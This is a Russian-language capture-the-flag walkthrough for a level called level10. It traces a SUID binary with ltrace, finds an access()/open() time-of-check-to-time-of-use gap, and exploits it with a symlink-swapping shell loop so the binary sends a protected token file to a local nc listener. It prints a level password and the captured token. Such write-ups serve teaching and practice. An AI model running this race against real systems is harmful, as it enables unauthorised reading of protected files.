```
ls -l
```
> total 16\
-rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10\
-rw-------  1 flag10 flag10     26 Mar  5  2016 token\

Все как обычно SUID и бинарь с токеном

```
./level10
```
> ./level10 file host\
	sends file to host if you have access to it

Попытавшись запустить видим что бинарник ждет файл и хоста

Создадим какой-нибудь файл и подадим его

```
echo 123 > /tmp/file
./level10 /tmp/file 127.0.0.1
```
> Connecting to 127.0.0.1:6969 .. Unable to connect to host 127.0.0.1

Не удается подключиться к хосту, попробуем послушать его через nc:
Откроем новый терминал:
```
ssh -p 4242 level10@<HOST>
```
Пароль:
```
s5cAJpM8ev6XHw998pRWG728z
```
Открываем соединение
```
nc -lk 127.0.0.1 6969
```

Пробуем подать бинарнику нужные параметры:

```
echo 123 > /tmp/file;
./level10 /tmp/file 127.0.0.1;
```
> Connecting to 127.0.0.1:6969 .. Connected!\
Sending file .. wrote file!

В новом терминале увидим такое содержимое:
> .*( )*.\
123\

Попробуем разобраться в том, что же такое делает этот бинарник:

```
ltrace ./level10 /tmp/file 127.0.0.1
```
> \_\_libc_start_main(0x80486d4, 3, 0xbffff794, 0x8048970, 0x80489e0 <unfinished ...>\
access("/tmp/file", 4)                                = 0\
printf("Connecting to %s:6969 .. ", "127.0.0.1")      = 32\
fflush(0xb7fd1a20Connecting to 127.0.0.1:6969 .. )                                    = 0\
socket(2, 1, 0)                                       = 3\
inet_addr("127.0.0.1")                                = 0x0100007f\
htons(6969, 1, 0, 0, 0)                               = 14619\
connect(3, 0xbffff6dc, 16, 0, 0)                      = 0\
write(3, ".*( )*.\n", 8)                              = 8\
printf("Connected!\nSending file .. "Connected!\
)                = 27\
fflush(0xb7fd1a20Sending file .. )                                    = 0\
open("/tmp/file", 0, 010)                             = 4\
read(4, "123\n", 4096)                                = 4\
write(3, "123\n", 4)                                  = 4\
puts("wrote file!"wrote file!\
)                                   = 12\
+++ exited (status 12) +++

Cамые первый вызов это access, узнаем о нем
```
man access
```
> Warning: Using access() to check if a user is authorized to, for example, open a file before actually doing so using open(2) creates a security hole, because the user\
       might  exploit  the  short time interval between checking and opening the file to manipulate it.  For this reason, the use of this system call should be avoided.\
       (In the example just described, a safer alternative would be to temporarily switch the process's effective user ID to the real ID and then call open(2).)\


Прочитав man видим, что при вызове access() нужно быть аккуратным:
**Это условие гонки. Мы выполняем access(), затем open(). За короткое время между двумя вызовами файл мог измениться.
создаем файл /tmp/exploit который изначально принадлежит нам. 
а целью является token. Приложение выполняет access(), видит, что файл действительно принадлежит пользователю, а значит может обработать этот файл.
Затем мы быстро заменяем файл символической ссылкой на token. Приложение уже приняло решение открыть /tmp/exploit.
Но когда оно это делает, оно действительно открывает и обрабатывает token.**

В одном терминале постоянно меняем ссылку, чтобы попасть в этот промежуток времени между access и open
```
touch /tmp/exploit;
echo 123 > /tmp/file;
while true; do ln -fs ~/token /tmp/exploit; ln -fs /tmp/file /tmp/exploit; done &
```

Далее запускаем этот скрипт:
```
while true; do ./level10 /tmp/exploit 127.0.0.1; done
```
> ...\
.*( )*.\
123\
.*( )*.\
woupa2yuojeeaaed06riuj63c\
.*( )*.\
123\
...
